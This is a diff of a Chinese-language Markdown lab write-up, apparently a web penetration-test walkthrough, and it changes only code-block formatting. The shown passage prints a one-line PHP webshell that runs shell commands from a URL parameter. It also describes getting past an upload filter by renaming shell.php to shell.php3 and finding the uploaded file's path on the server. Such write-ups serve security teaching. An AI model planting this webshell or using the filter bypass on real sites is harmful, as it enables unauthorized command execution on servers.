@@ -47,10 +47,10 @@
 	* ![](image/success.png)
 * 尝试上传webshell并执行
 	* 先在本地编写PHP代码并保存为shell.php文件,然后利用网站的上传功能上传此文件。发现上传失败，网站对PHP文件的上传进行了限制。将文件重命名为shell.php3，上传成功。
-	<code>code：
+	```
 	<?php
 	  system($_GET['cmd']);
-	?></code>
+	?>```
 	* ![](image/upload_php.png)
 	* 通过浏览器的网页编辑功能找到上传的shell.php3在web服务器端的保存位置，位置为`admin/uploads/shell.php3`
 	* ![](image/img_src.png)
